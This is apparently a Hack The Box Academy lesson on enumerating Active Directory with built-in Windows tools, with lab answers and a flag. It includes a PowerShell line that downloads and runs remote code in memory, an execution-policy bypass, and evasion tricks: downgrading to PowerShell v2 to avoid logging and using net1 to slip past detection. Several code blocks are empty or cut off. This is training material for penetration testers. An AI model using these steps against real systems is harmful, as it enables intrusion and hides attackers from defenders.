# Living Off the Land

Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.

***

### Scenario

Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.

***

### Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

**Basic Enumeration Commands**

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

**Basic Enumeration**

![image](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

**Systeminfo**

![image](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)

The `systeminfo` command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

***

### Harnessing PowerShell

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2) settings for each scope on a host.                                       |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`          | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

Let's see them in action now on the `MS01` host.

We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

**Downgrade Powershell**

```

We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the `Windows PowerShell` log entries.

**Examining the Powershell Event Log**

![text](https://academy.hackthebox.com/storage/modules/143/downgrade.png)

With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_logging\_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

### Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

```

Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

### Network Information

| **Networking Commands**        | **Description**                                                                                                  |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                       | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

Commands such as `ipconfig /all` and `systeminfo` show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. `arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning

Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

### Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

**Quick WMI checks**

| **Command**                                                                          | **Description**                                                                                        |

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

WMI is a vast topic, and it would be impossible to touch on everything it is capable of in one part of a section. For more information about WMI and its capabilities, check out the official [WMI documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi).

### Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

* Local and domain users
* Groups
* Hosts
* Specific users in groups
* Domain Controllers
* Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.

**Net Commands Trick**

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

### Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

**Dsquery DLL**

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

**Users With Specific Attributes Set (PASSWD\_NOTREQD)**

#### LDAP Filtering Explained

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).\
`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

**UAC Values**

![text](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

**OID match strings**

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

**Logical Operators**

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:\
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:\
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

We have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, `Kerberoasting`.

**Questions**

Enumerate the host's security configuration information and provide its AMProductVersion.

```powershell
Get-MpComputerStatus
#AMProductVersion                 : 4.18.2109.6
```

What domain user is explicitly listed as a member of the local Administrators group on the target host?

```powershell
net localgroup Administrators
#INLANEFREIGHT\adunn
```

Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.

```powershell
#1
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(description=*))" -attr displayName description
#2
Get-ADUser -Filter {Enabled -eq $false} -Properties Description | Select-Object Name, Description
#Betty Ross  HTB{LD@P_I$_W1ld}
```
